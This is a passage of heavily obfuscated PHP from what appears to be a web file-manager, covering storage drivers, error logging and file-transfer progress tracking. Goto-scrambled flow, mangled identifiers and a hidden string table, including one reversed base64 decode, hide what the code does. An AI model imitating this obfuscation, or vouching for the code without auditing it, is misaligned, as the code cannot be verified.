LOCK_EX); clearstatcache(); return strlen($b÷×‡ÔŒÛ‡) == filesize($f˜Á„Šµó); } public function fileSubstr($aòÓ¡¤ÅäŠ, $d“öİå¨ë¬ = 0, $DÁõÌµ™Áì = false) { goto Eùçºœİôê; fÚ¤µáÜĞ©: fseek($a†¶ÛÇ¢, $d“öİå¨ë¬); $e¾«ÛÀ„ê = fread($a†¶ÛÇ¢, $DÁõÌµ™Áì); fclose($a†¶ÛÇ¢); goto A˜¿ßåÍÛª; Eùçºœİôê: $BçÆ¯Çè¾ =& $_SERVER[Å¸ş]; $aòÓ¡¤ÅäŠ = $this->iconvSystem($aòÓ¡¤ÅäŠ); if ($DÁõÌµ™Áì === !1) { $DÁõÌµ™Áì = $this->size($aòÓ¡¤ÅäŠ); } goto FäƒÙŒ«‰¨; A˜¿ßåÍÛª: return $e¾«ÛÀ„ê; goto eĞÈåœƒ÷™; FäƒÙŒ«‰¨: if ($DÁõÌµ™Áì <= 0) { return $BçÆ¯Çè¾[33]; } $a†¶ÛÇ¢ = fopen($aòÓ¡¤ÅäŠ, $BçÆ¯Çè¾[1168]); if (!$a†¶ÛÇ¢) { return !1; } goto fÚ¤µáÜĞ©; eĞÈåœƒ÷™: } public function upload($eµñáˆëËÆ, $a×ªç«Úø, $a‚®ÑË¢è = false, $f†Ä¼óÛÒÓ = REPEAT_REPLACE) { $b¯İœÊµ›÷ = $this->copyFile($a×ªç«Úø, $eµñáˆëËÆ); return $b¯İœÊµ›÷ ? $this->getPathOuter($eµñáˆëËÆ) : !1; } public function setModifyTime($CŒ˜Èó¯öº, $Fµ„­ÚÈ‹„ = '') { @touch($CŒ˜Èó¯öº, intval($Fµ„­ÚÈ‹„)); } public function download($C‰È‚´¯´ö, $Cã§•ŠÚñ) { return $this->iconvSystem($C‰È‚´¯´ö); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($d¢ÕÆóÌÀÑ) { parent::__construct($d¢ÕÆóÌÀÑ); $this->signatureVersion($_SERVER[Å¸ş][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($B‹®±äˆ¸) { parent::__construct($B‹®±äˆ¸); $this->signatureVersion($_SERVER[Å¸ş][200]); } public function fileOutLink($b»¹Ø“Ó¥¬) { $Eã­˜‘ä˜ =& $_SERVER[Å¸ş]; if (substr($b»¹Ø“Ó¥¬, 0, 7) == $Eã­˜‘ä˜[1113]) { $b»¹Ø“Ó¥¬ = $Eã­˜‘ä˜[1114] . substr($b»¹Ø“Ó¥¬, 7); } header($Eã­˜‘ä˜[156] . $b»¹Ø“Ó¥¬); die; } } goto C´ã§Íº·Ô; Fœå¤øœäØ: function beforeShutdown() { Hook::trigger($_SERVER[ãˆÙà–ÃÙ][32]); } $_SERVER[$_SERVER[ãˆÙà–ÃÙ][33]] = BASIC_PATH; $_SERVER[$_SERVER[ãˆÙà–ÃÙ][34]] = LIB_DIR; goto Dƒöİ¯¥—; Dƒöİ¯¥—: function beforeShutdownError($b  º ¦Ù = false, $c‰ÙŠ™Öò· = '', $e‡†õß×…¶ = '', $d½†ß‚áµÌ = 0) { $fÂ·½–Öœ =& $_SERVER[ãˆÙà–ÃÙ]; switch ($b  º ¦Ù) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $cÊçÄ„¦ÑÛ = $fÂ·½–Öœ[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $cÊçÄ„¦ÑÛ = $fÂ·½–Öœ[36]; break; case E_STRICT: $cÊçÄ„¦ÑÛ = $fÂ·½–Öœ[37]; break; case E_NOTICE: case E_USER_NOTICE: $cÊçÄ„¦ÑÛ = $fÂ·½–Öœ[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $cÊçÄ„¦ÑÛ = $fÂ·½–Öœ[39]; break; default: break; } if (!$cÊçÄ„¦ÑÛ || $cÊçÄ„¦ÑÛ == $fÂ·½–Öœ[38] || $cÊçÄ„¦ÑÛ == $fÂ·½–Öœ[39]) { return; } $e‡†õß×…¶ = $fÂ·½–Öœ[4] . str_replace($_SERVER[$fÂ·½–Öœ[33]], $fÂ·½–Öœ[16], $e‡†õß×…¶); $cÓßÜ³ßå÷ = $cÊçÄ„¦ÑÛ . $fÂ·½–Öœ[40] . $c‰ÙŠ™Öò· . $fÂ·½–Öœ[40] . $e‡†õß×…¶ . $fÂ·½–Öœ[40] . $d½†ß‚áµÌ; write_log($cÓßÜ³ßå÷ . $fÂ·½–Öœ[41] . get_caller_msg(1), $fÂ·½–Öœ[15]); } $_SERVER[$_SERVER[ãˆÙà–ÃÙ][42]] = $_SERVER[$_SERVER[ãˆÙà–ÃÙ][33]] . $_SERVER[ãˆÙà–ÃÙ][43]; $FÜ¿ËÈœ = strrev(base64_decode($_SERVER[ãˆÙà–ÃÙ][44])); goto C–ÏÊåÕ; bí¯Ö®É°È: class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\x69\156\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($E‡¿…åÒìË, $Fö£Ëôª´Ö = '', $AŞ–³¾ãˆ÷ = 0, $Fç¾§Ÿß«Ã = '') { goto f¤¬ºâËÈ; bùì‹Á£Úê: Hook::bind($fÂ‰¡Á»³[1402], array($this, $fÂ‰¡Á»³[1444])); Hook::bind($fÂ‰¡Á»³[1445], array($this, $fÂ‰¡Á»³[1446])); $this->startAfter(); goto A¤í ´¤êÓ; A¤í ´¤êÓ: Hook::trigger($fÂ‰¡Á»³[1447], $this->task); $this->task[$fÂ‰¡Á»³[1441]] = timeFloat(); goto b¤õ²·£ô; f¤¬ºâËÈ: $fÂ‰¡Á»³ =& $_SERVER[Å¸ş]; if (self::get($E‡¿…åÒìË)) { return; } $this->task = array($fÂ‰¡Á»³[367] => $E‡¿…åÒìË, $fÂ‰¡Á»³[1436] => USER_ID, $fÂ‰¡Á»³[1340] => $Fç¾§Ÿß«Ã, $fÂ‰¡Á»³[29] => $Fö£Ëôª´Ö, $fÂ‰¡Á»³[976] => $fÂ‰¡Á»³[33], $fÂ‰¡Á»³[974] => $AŞ–³¾ãˆ÷, $fÂ‰¡Á»³[988] => 0, $fÂ‰¡Á»³[1437] => 0, $fÂ‰¡Á»³[1438] => 0, $fÂ‰¡Á»³[1439] => timeFloat(), $fÂ‰¡Á»³[1440] => 0, $fÂ‰¡Á»³[1441] => 0, $fÂ‰¡Á»³[1442] => 0, $fÂ‰¡Á»³[1443] => 0, $fÂ‰¡Á»³[692] => $fÂ‰¡Á»³[1400]); goto bùì‹Á£Úê; b¤õ²·£ô: } public function end() { goto dó“«ÏøæÎ; aÒöÂÊ‹: Hook::unbind($Eï½Üùƒç“[1445], array($this, $Eï½Üùƒç“[1446])); $this->endAfter(); $this->task = !1; goto fÔ˜Åßœ´; d¡Í¤Šá£Á: $bø¨ƒÂŸÔ“ = timeFloat() - $this->task[$Eï½Üùƒç“[1439]]; self::log($Eï½Üùƒç“[1448] . $this->task[$Eï½Üùƒç“[367]] . $Eï½Üùƒç“[1449] . $bø¨ƒÂŸÔ“ . $Eï½Üùƒç“[1450]); Hook::unbind($Eï½Üùƒç“[1402], array($this, $Eï½Üùƒç“[1444])); goto aÒöÂÊ‹; dó“«ÏøæÎ: $Eï½Üùƒç“ =& $_SERVER[Å¸ş]; if (!$this->task) { return; } if ($this->task[$Eï½Üùƒç“[1441]]) { self::valueSet($this->task[$Eï½Üùƒç“[367]], !1); } goto d¡Í¤Šá£Á; fÔ˜Åßœ´: } public function update($aèÍÍ³õÔÊ = 0) { goto Aäİñ´»ª½; e‰à³³ã˜¾: Hook::trigger($E¢ãŠ¥‚›Ó[1454], $dğ§ÀŒÊš); self::valueSet($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[367]], $dğ§ÀŒÊš); goto EÃê°¾Á³; Aäİñ´»ª½: $E¢ãŠ¥‚›Ó =& $_SERVER[Å¸ş]; $dğ§ÀŒÊš =& $this->task; if (!$dğ§ÀŒÊš) { return; } goto d£“‡ÂóÁ; C½ôòÙ¿¯: $this->updateAfter(); $cî…Í‹¡ï = 0.2; if (timeFloat() - $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1441]] < $cî…Í‹¡ï) { return; } goto E¹®ÔíöÓˆ; E¹®ÔíöÓˆ: $b‰â’˜ó®© = self::get($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[367]]); $aÙ·Õğìçš = $b‰â’˜ó®©[$E¢ãŠ¥‚›Ó[692]]; if ($aÙ·Õğìçš == self::STATYS_KILL) { $AÇ‡´™µ = array($E¢ãŠ¥‚›Ó[1451] => LNG($E¢ãŠ¥‚›Ó[1452]), $E¢ãŠ¥‚›Ó[1030] => !1); Cache::set($E¢ãŠ¥‚›Ó[1453] . $this->task[$E¢ãŠ¥‚›Ó[367]], $AÇ‡´™µ, 30); $this->end(); die; } else { if ($aÙ·Õğìçš == self::STATYS_STOP) { $DÎìŠ£ŠÔÂ = 2; $b‰â’˜ó®©[$E¢ãŠ¥‚›Ó[1442]] += $DÎìŠ£ŠÔÂ; self::valueSet($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[367]], $b‰â’˜ó®©); sleep($DÎìŠ£ŠÔÂ); $this->update(); return; } } goto c´„Óöíè; c´„Óöíè: $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[692]] = $aÙ·Õğìçš ? $aÙ·Õğìçš : $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[692]]; $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1442]] = $b‰â’˜ó®©[$E¢ãŠ¥‚›Ó[1442]] ? $b‰â’˜ó®©[$E¢ãŠ¥‚›Ó[1442]] : 0; $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1441]] = timeFloat(); goto e‰à³³ã˜¾; d£“‡ÂóÁ: $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[988]] += $aèÍÍ³õÔÊ; $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1440]] = timeFloat(); if ($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[974]]) { if ($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[974]] < $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[988]]) { $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[974]] = $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[988]]; } $F‡Ô‚‰š¸ğ = timeFloat() - $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1439]] - $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1442]]; $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1437]] = $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[988]] / $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[974]]; $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1438]] = $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[988]] / $F‡Ô‚‰š¸ğ; if ($dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1437]] > 0) { $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1443]] = $F‡Ô‚‰š¸ğ * (1 - $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1437]]) / $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1437]]; } $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1443]] = $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1443]] <= 0 ? 0 : $dğ§ÀŒÊš[$E¢ãŠ¥‚›Ó[1443]]; } goto C½ôòÙ¿¯; EÃê°¾Á³: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($fí­æŒ§Î‡) { $EÙ¢«Ôøƒî =& $_SERVER[Å¸ş]; Cache::set($EÙ¢«Ôøƒî[1453] . $this->task[$EÙ¢«Ôøƒî[367]], $fí­æŒ§Î‡, 60); return $fí­æŒ§Î‡; } public static function get($A‹õ…½Ñ) { return self::valueGet($A‹õ…½Ñ); } public static function listData() { $aÜô¬šîÜ• = self::valueGet(); return array_sort_by($aÜô¬šîÜ•, $_SERVER[Å¸ş][1439], !0); } public static function kill($dÃƒ…´Óå) { return self::changeStatus($dÃƒ…´Óå, self::STATYS_KILL); } public static function stop($d“ç×ÆĞÍ˜) { return self::changeStatus($d“ç×ÆĞÍ˜, self::STATYS_STOP); } public static function restart($fŠ×†±¶‘) { return self::changeStatus($fŠ×†±¶‘, self::STATYS_RUNNING); } public static function killAll() { $fÆ¼Ö±ñ™¥ =& $_SERVER[Å¸ş]; $b¦²ˆ»Ù°‡ = self::listData(); foreach ($b¦²ˆ»Ù°‡ as $A‘øäå¹±) { self::kill($A‘øäå¹±[$fÆ¼Ö±ñ™¥[367]]); } sleep(2); foreach ($b¦²ˆ»Ù°‡ as $A‘øäå¹±) { self::valueSet($A‘øäå¹±[$fÆ¼Ö±ñ™¥[367]], !1); } } private static function changeStatus($bê÷Í±‹, $Fàßö¦ùæ´) { goto f÷à½µŞƒß; FíœÍªÒšõ: $Dê¤ŒØ¨È[$fÌ°×Ñ·Ÿ×[692]] = $Fàßö¦ùæ´; self::valueSet($bê÷Í±‹, $Dê¤ŒØ¨È); self::log($fÌ°×Ñ·Ÿ×[1455] . $Dê¤ŒØ¨È[$fÌ°×Ñ·Ÿ×[367]] . $fÌ°×Ñ·Ÿ×[1456] . $Fàßö¦ùæ´); goto D‘Ë¸Ïä²¡; D‘Ë¸Ïä²¡: return !0; goto eô†¨¾º»; f÷à½µŞƒß: $fÌ°×Ñ·Ÿ× =& $_SERVER[Å¸ş]; $Dê¤ŒØ¨È = self::valueGet($bê÷Í±‹); if (!$Dê¤ŒØ¨È) { return !1; } goto FíœÍªÒšõ; eô†¨¾º»: } public static function valueGet($B¼øø÷£‘‚ = false) { $fƒ‰„°ŸÇÍ =& $_SERVER[Å¸ş]; if ($B¼øø÷£‘‚) { $fÑ²¥ƒ¥â¦ = Model($fƒ‰„°ŸÇÍ[399])->where(array($fƒ‰„°ŸÇÍ[89] => $B¼øø÷£‘‚, $fƒ‰„°ŸÇÍ[29] => $fƒ‰„°ŸÇÍ[1457]))->find(); return $fÑ²¥ƒ¥â¦ ? json_decode($fÑ²¥ƒ¥â¦[$fƒ‰„°ŸÇÍ[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f¸¾Àö°—Ì = false) { goto eÎßñˆä†Á; B†ğñà‚¹: return $c¬šÀŞ ½æ; goto cïÁ éö; e–¹’·óÀ: $c¬šÀŞ ½æ = Model($cèÆ°¸·Ø[399])->where($BÁóŸ¡»Ÿ’)->select(); $c¬šÀŞ ½æ = $c¬šÀŞ ½æ ? $c¬šÀŞ ½æ : array(); foreach ($c¬šÀŞ ½æ as $Bî‚äæÁ· => $DÙŒˆ‹£ß¬) { $c¬šÀŞ ½æ[$Bî‚äæÁ·] = json_decode($DÙŒˆ‹£ß¬[$cèÆ°¸·Ø[359]], !0); } goto B†ğñà‚¹; eÎßñˆä†Á: $cèÆ°¸·Ø =& $_SERVER[Å¸ş]; $BÁóŸ¡»Ÿ’ = array($cèÆ°¸·Ø[29] => $cèÆ°¸·Ø[1457]); if ($f¸¾Àö°—Ì) { $BÁóŸ¡»Ÿ’[$cèÆ°¸·Ø[1436]] = $f¸¾Àö°—Ì; } goto e–¹’·óÀ; cïÁ éö: } public static function valueSet($AŒ²¬ “ßé, $Aˆ…óñÃÍ) { goto bÔÍëõ‹À”; AèŠ™á¤ï·: Model($cœ›à÷£è[399])->add($dÚ¨¼Ú‘‡‰, array(), !0); goto EùÉ×êÍÈº; AÙ†¾ß³Œ: if (!$aŠŠ¾ºÌô) { ob_start(); var_dump($Aˆ…óñÃÍ); $Fâ¨¹ŠÒÀì = ob_get_clean(); self::log($cœ›à÷£è[1458] . json_encode_force($Fâ¨¹ŠÒÀì)); } if (!$AŒ²¬ “ßé || !$Aˆ…óñÃÍ[$cœ›à÷£è[367]]) { return !1; } $dÚ¨¼Ú‘‡‰ = array($cœ›à÷£è[29] => $cœ›à÷£è[1457], $cœ›à÷£è[1436] => USER_ID, $cœ›à÷£è[89] => $AŒ²¬ “ßé, $cœ›à÷£è[359] => $aŠŠ¾ºÌô); goto AèŠ™á¤ï·; bÔÍëõ‹À”: $cœ›à÷£è =& $_SERVER[Å¸ş]; if (!$Aˆ…óñÃÍ) { return Model($cœ›à÷£è[399])->where(array($cœ›à÷£è[89] => $AŒ²¬ “ßé, $cœ›à÷£è[29] => $cœ›à÷£è[1457]))->delete(); } $aŠŠ¾ºÌô = json_encode($Aˆ…óñÃÍ); goto AÙ†¾ß³Œ; EùÉ×êÍÈº: } public static function log($e´à¢‘¯–ğ) { write_log($e´à¢‘¯–ğ, $_SERVER[Å¸ş][1459]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto c¥³òù¡™; bâÎ ”ó‡Ó: Hook::bind($bœ«•Ä±¼¿[1473], array($this, $bœ«•Ä±¼¿[1474])); Hook::bind($bœ«•Ä±¼¿[1475], array($this, $bœ«•Ä±¼¿[1476])); Hook::bind($bœ«•Ä±¼¿[1477], array($this, $bœ«•Ä±¼¿[1478])); goto bñ³ÆÎ¤å”; bñ³ÆÎ¤å”: $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1479]] = LNG($bœ«•Ä±¼¿[1480]); $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1481]] = 0; $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1482]] = 0; goto E÷Å¯«ãµ¶; bŸ®–â¯Œ: $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1485]] = 0; $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1486]] = 0; if (!$dˆ–³°£Õæ[$bœ«•Ä±¼¿[1340]]) { $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1340]] = LNG($bœ«•Ä±¼¿[1487]); } goto B­çšÕÈ Æ; c¥³òù¡™: $bœ«•Ä±¼¿ =& $_SERVER[Å¸ş]; $dˆ–³°£Õæ =& $this->task; $this->sourceCopyFolder = !1; goto dÇ Ÿ ÅÃ±; dëÙ·Ãµ­: Hook::bind($bœ«•Ä±¼¿[513], array($this, $bœ«•Ä±¼¿[1469])); Hook::bind($bœ«•Ä±¼¿[515], array($this, $bœ«•Ä±¼¿[1469])); Hook::bind($bœ«•Ä±¼¿[517], array($this, $bœ«•Ä±¼¿[1469])); goto cø•±ğ‰‚˜; dÇ Ÿ ÅÃ±: Hook::bind($bœ«•Ä±¼¿[1460], array($this, $bœ«•Ä±¼¿[1461])); Hook::bind($bœ«•Ä±¼¿[1462], array($this, $bœ«•Ä±¼¿[1463])); Hook::bind($bœ«•Ä±¼¿[1464], array($this, $bœ«•Ä±¼¿[1465])); goto bÔÖÛäÔ”; fìàŞ¡­ó: Hook::bind($bœ«•Ä±¼¿[545], array($this, $bœ«•Ä±¼¿[1468])); Hook::bind($bœ«•Ä±¼¿[511], array($this, $bœ«•Ä±¼¿[1469])); Hook::bind($bœ«•Ä±¼¿[508], array($this, $bœ«•Ä±¼¿[1469])); goto dëÙ·Ãµ­; E÷Å¯«ãµ¶: $dˆ–³°£Õæ[$bœ«•Ä±¼¿[976]] = $bœ«•Ä±¼¿[33]; $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1483]] = $bœ«•Ä±¼¿[33]; $dˆ–³°£Õæ[$bœ«•Ä±¼¿[1484]] = 0; goto bŸ®–â¯Œ; cø•±ğ‰‚˜: Hook::bind($bœ«•Ä±¼¿[1470], array($this, $bœ«•Ä±¼¿[1471])); Hook::bind($bœ«•Ä±¼¿[534], array($this, $bœ«•Ä±¼¿[1472])); $this->sourceModelCopyFlag = !1; goto bâÎ ”ó‡Ó; bÔÖÛäÔ”: Hook::bind($bœ«•Ä±¼¿[541], array($this, $bœ«•Ä±¼¿[1466])); Hook::bind($bœ«•Ä±¼¿[542], array($this, $bœ«•Ä±¼¿[1467])); Hook::bind($bœ«•Ä±¼¿[544], array($this, $bœ«•Ä±¼¿[1468])); goto fìàŞ¡­ó; B­çšÕÈ Æ: } protected function endAfter() { goto cˆ¥å“Èå½; cˆ¥å“Èå½: $C¥Š à =& $_SERVER[Å¸ş]; Hook::unbind($C¥Š à[1460], array($this, $C¥Š à[1461])); Hook::unbind($C¥Š à[1462], array($this, $C¥Š à[1463])); goto FŞ‰ğ…ÃÏ; FŞ‰ğ…ÃÏ: Hook::unbind($C¥Š à[1464], array($this, $C¥Š à[1465])); Hook::unbind($C¥Š à[541], array($this, $C¥Š à[1466])); Hook::unbind($C¥Š à[542], array($this, $C¥Š à[1467])); goto C¹ÄİÜ–š; f¨·Àä×Ñ: Hook::unbind($C¥Š à[508], array($this, $C¥Š à[1469])); Hook::unbind($C¥Š à[513], array($this, $C¥Š à[1469])); Hook::unbind($C¥Š à[515], array($this, $C¥Š à[1469])); goto cÚ×ØÌÄÑ; C¹ÄİÜ–š: Hook::unbind($C¥Š à[544], array($this, $C¥Š à[1468])); Hook::unbind($C¥Š à[545], array($this, $C¥Š à[1468])); Hook::unbind($C¥Š à[511], array($this, $C¥Š à[1469])); goto f¨·Àä×Ñ; AÉ³ƒ¨ÌØ: Hook::unbind($C¥Š à[1473], array($this, $C¥Š à[1474])); Hook::unbind($C¥Š à[1475], array($this, $C¥Š à[1476])); Hook::unbind($C¥Š à[1477], array($this, $C¥Š à[1478])); goto DÉ³ï¨Ş‘·; cÚ×ØÌÄÑ: Hook::unbind($C¥Š à[517], array($this, $C¥Š à[1469])); Hook::unbind($C¥Š à[1470], array($this, $C¥Š à[1471])); Hook::unbind($C¥Š à[534], array($this, $C¥Š à[1472])); goto AÉ³ƒ¨ÌØ; DÉ³ï¨Ş‘·: } public function copyMoveStart($aÈ®ñ¯—¤Á, $DÕÓ¦‹¾Ê, $e„©´¶É˜ã, $D ÑŸæäœÀ) { goto Eğ¼¶Ö¼Ä; a­Ë»îÎÃŠ: $aƒ‹÷‘’›ª[$DÎå‘­œ²[1489]] = KodIO::transferType($aÈ®ñ¯—¤Á, $e„©´¶É˜ã); $this->update(); goto Cí—Šë„ñô; Eğ¼¶Ö¼Ä: $DÎå‘­œ² =& $_SERVER[Å¸ş]; self::log($DÎå‘­œ²[1488] . $DÕÓ¦‹¾Ê . $DÎå‘­œ²[66] . $D ÑŸæäœÀ); $cª¬ìÈÑ“– = rtrim(TEMP_FILES, $DÎå‘­œ²[8]); goto eä›³Êò‡í; eä›³Êò‡í: if (substr($DÕÓ¦‹¾Ê, 0, strlen($cª¬ìÈÑ“–)) == $cª¬ìÈÑ“–) { return; } if (substr($D ÑŸæäœÀ, 0, strlen($cª¬ìÈÑ“–)) == $cª¬ìÈÑ“–) { return; } $aƒ‹÷‘’›ª =& $this->task; goto a­Ë»îÎÃŠ; Cí—Šë„ñô: } public function updateAfter() { goto b†ìäáÌò; aÂ¸§ã—Ã: if ($this->sourceModelCopyFlag) { return; } if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1489]] == $b¹™…ßÈ†¡[1092]) { return; } if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1489]] == $b¹™…ßÈ†¡[1038] || $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1489]] == $b¹™…ßÈ†¡[103]) { if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1483]]) { $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1486]] = $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1485]] + $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1482]]; } } else { if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1489]] == $b¹™…ßÈ†¡[1093]) { if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1483]] == $b¹™…ßÈ†¡[1038]) { $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1486]] = $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1485]] + $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1482]] * 0.5; } else { if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1483]] == $b¹™…ßÈ†¡[103]) { $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1486]] = $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1485]] + $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1481]] * 0.5 + $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1482]] * 0.5; } } } } goto C²Çñ´‘æˆ; b†ìäáÌò: $b¹™…ßÈ†¡ =& $_SERVER[Å¸ş]; $b¶‚øºÓ™Ô =& $this->task; if (!$b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[701]]) { return; } goto aÂ¸§ã—Ã; C²Çñ´‘æˆ: $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1437]] = $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1486]] / $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[701]]; if ($b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1437]] > 0) { $dè®ğ•š = timeFloat() - $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1439]] - $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1442]]; $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1443]] = $dè®ğ•š * (1 - $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1437]]) / $b¶‚øºÓ™Ô[$b¹™…ßÈ†¡[1437]]; } goto b‡º‹Ë¦…; b‡º‹Ë¦…: } public function addPath($e¾óÓ¦ÆË‚) { goto AÆÜÉ¡ˆäÇ; eº»ÉÃÇ£: $cµƒ»²ä‘ = IO::infoWithChildren($e¾óÓ¦ÆË‚); $EŠØ¸„ = $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[1490]] ? $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[1490]][$cæñ¿ïõ¦ê[1491]] : 0; $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[1490]] = array($cæñ¿ïõ¦ê[1491] => $EŠØ¸„ + 1, $cæñ¿ïõ¦ê[386] => $cµƒ»²ä‘[$cæñ¿ïõ¦ê[28]], $cæñ¿ïõ¦ê[75] => $cµƒ»²ä‘[$cæñ¿ïõ¦ê[75]], $cæñ¿ïõ¦ê[468] => $cµƒ»²ä‘[$cæñ¿ïõ¦ê[468]] ? $cµƒ»²ä‘[$cæñ¿ïõ¦ê[468]] : $cµƒ»²ä‘[$cæñ¿ïõ¦ê[75]]); goto c´”ñ÷†Èì; AÆÜÉ¡ˆäÇ: $cæñ¿ïõ¦ê =& $_SERVER[Å¸ş]; if (!$e¾óÓ¦ÆË‚) { return; } $Dğ²‹ĞêŒ =& $this->task; goto eº»ÉÃÇ£; c´”ñ÷†Èì: if ($cµƒ»²ä‘[$cæñ¿ïõ¦ê[29]] == $cæñ¿ïõ¦ê[167]) { $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[974]] += 1; } else { $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[974]] += $cµƒ»²ä‘[$cæñ¿ïõ¦ê[80]][$cæñ¿ïõ¦ê[78]]; if ($cµƒ»²ä‘[$cæñ¿ïõ¦ê[369]]) { $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[974]] += $cµƒ»²ä‘[$cæñ¿ïõ¦ê[80]][$cæñ¿ïõ¦ê[79]] + 1; } } $Dğ²‹ĞêŒ[$cæñ¿ïõ¦ê[701]] += $cµƒ»²ä‘[$cæñ¿ïõ¦ê[77]]; $this->update(); goto c„ØŠË©ì¼; c„ØŠË©ì¼: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d¤Ä¿‰Ïº) { $F²İœİ—ŠÒ =& $_SERVER[Å¸ş]; $A‘Êôğªé× =& $this->task; $A‘Êôğªé×[$F²İœİ—ŠÒ[1479]] = $d¤Ä¿‰Ïº[$F²İœİ—ŠÒ[28]]; $A‘Êôğªé×[$F²İœİ—ŠÒ[976]] = $d¤Ä¿‰Ïº[$F²İœİ—ŠÒ[28]]; $this->update(); } public function copyFileStart($f·„ÖŒÓö˜, $dÒ†Ûƒª‡, $A¢Êƒ²¶›, $d®ñ‘î¿Ù±, $eÌ¢ÆäŒ²î, $a¼Ó©è•¢Ã) { goto eßÇÌöÄã; fß–’ ÊÚµ: $B£™ãÔ“[$aô¼Óº¤øí[1479]] = $eĞóÀšˆÙÌ; $B£™ãÔ“[$aô¼Óº¤øí[1481]] = (int) $f·„ÖŒÓö˜->size($dÒ†Ûƒª‡); $B£™ãÔ“[$aô¼Óº¤øí[1482]] = 0; goto A¯†¥šå™; E†àÃù‰Ú„: $GLOBALS[$aô¼Óº¤øí[1493]] = $eÌ¢ÆäŒ²î; $GLOBALS[$aô¼Óº¤øí[1492]] = $a¼Ó©è•¢Ã; $B£™ãÔ“ =& $this->task; goto fß–’ ÊÚµ; eßÇÌöÄã: $aô¼Óº¤øí =& $_SERVER[Å¸ş]; $eĞóÀšˆÙÌ = $eÌ¢ÆäŒ²î; if ($eĞóÀšˆÙÌ == $GLOBALS[$aô¼Óº¤øí[1492]]) { $eĞóÀšˆÙÌ = $GLOBALS[$aô¼Óº¤øí[1493]]; } goto E†àÃù‰Ú„; d¤ëŸ–¶ñ: $this->update(); goto FÁê¿‰¹æ; A¯†¥šå™: 